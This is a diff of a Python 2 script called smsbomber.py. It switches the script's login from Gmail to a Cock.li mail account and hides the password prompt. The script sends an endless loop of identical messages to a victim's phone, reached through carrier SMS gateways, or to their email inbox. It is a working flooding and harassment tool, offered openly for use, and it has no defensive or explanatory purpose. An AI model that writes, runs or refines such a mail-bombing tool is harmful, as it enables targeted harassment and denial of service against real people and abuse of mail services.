@@ -1,17 +1,19 @@
 # Name: smsbomber.py
-# Made by cxdy on GitHub
-# Feel free to repost, leave credit in tact.
+# Coded by cxdy on Github
+# Please don't repost, and don't remove this.
 
 
 import smtplib as s
+import getpass
 
-print"\n\r\n\rCody's SMS Bomber \n\r"
-print"\n\r\n\rPlease login with your Gmail account \n\r"
+print"Cody's SMS/Email Bomber \n\r"
+print"Please login with your Cock.li account \n\r"
+print"No account? https://cock.li/register \n\r"
 
-username = raw_input("Gmail Username: ") 
-password = raw_input("Gmail Password: ") 
+username = raw_input("Cock.li Username: ")
+password = getpass.getpass(prompt='Cock.li Password: ')
 
-obj = s.SMTP("smtp.gmail.com:587")
+obj = s.SMTP("mail.cock.li:587")
 obj.starttls()
 obj.login(username, password)
 print"\n\r"
@@ -19,12 +21,12 @@ print"\n\r"
 print """ What kind of bomb would you like to send?
 
 1. SMS
-2. Email 
- 
+2. Email
+
 """
-option = input()    		   
+option = input()
 print("\n\r")
-if option == 1:    
+if option == 1:
     carrier_attack = 0
     print """ What is their carrier? Respond with the corresponding number
 	1. Alltel
@@ -33,11 +35,10 @@ if option == 1:
 	4. Sprint
 	5. T-Mobile
 	6. Telus
-	7. Verizon	
+	7. Verizon
 	8. Virgin Mobile
 	9. Orange
-	\n\r
-"""	
+"""
     carrier = input()
 
     if carrier == 1:
@@ -63,17 +64,17 @@ if option == 1:
     message = raw_input("Message: ")
     phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
        % (username, "" .join(v_phone), "" .join(message)))
-    
+
     while 1:
         obj.sendmail(username, v_phone, phone_message)
 	print "Message sent! Sending another.. Press Ctrl + C to stop."
 
-if option == 2:     
+if option == 2:
     v_email = raw_input("Email: ")
     message = raw_input("Message: ")
     email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
        % (username, "" .join(v_email), "" .join(message)))
-    
+
     while 1:
         obj.sendmail(username, v_email, email_message)
 	print "Message sent! Sending another.. Press Ctrl + C to stop."
